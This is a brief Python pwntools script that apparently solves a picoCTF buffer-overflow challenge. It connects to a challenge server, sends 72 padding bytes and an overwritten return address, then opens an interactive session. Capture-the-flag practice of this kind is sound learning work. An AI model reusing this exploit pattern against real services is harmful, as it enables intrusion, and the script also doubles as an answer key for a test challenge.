from pwn import *

r = remote("saturn.picoctf.net", 60777)
payload = b'A'*72 + p64(0x000000000040123b)
# r.recvuntil(b":")
r.sendline(payload)
r.interactive()